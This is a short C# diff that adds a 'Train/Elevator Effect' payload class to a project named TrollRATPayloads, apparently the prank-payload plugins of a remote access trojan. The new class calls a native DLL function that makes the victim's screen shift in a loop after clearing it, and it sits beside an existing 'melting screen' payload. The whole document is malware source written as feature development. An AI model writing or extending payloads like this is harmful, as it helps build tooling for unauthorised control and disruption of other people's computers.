@@ -49,4 +49,27 @@ namespace TrollRATPayloads.Payloads
             payloadMeltingScreen((int)size.Value, (int)power.Value);
         }
     }
+
+    public class PayloadTrain : LoopingPayload
+    {
+        [DllImport("Plugins\\TrollRATNative.dll")]
+        public static extern void payloadTrain(int xPower, int yPower);
+
+        private PayloadSettingNumber xPower = new PayloadSettingNumber(10, "X Movement", -100, 100, 1);
+        private PayloadSettingNumber yPower = new PayloadSettingNumber(0, "Y Movement", -100, 100, 1);
+
+        public PayloadTrain() : base(5)
+        {
+            actions.Add(new PayloadActionClearScreen());
+            settings.Add(xPower);
+            settings.Add(yPower);
+
+            name = "Train/Elevator Effect";
+        }
+
+        protected override void execute()
+        {
+            payloadTrain((int)xPower.Value, (int)yPower.Value);
+        }
+    }
 }
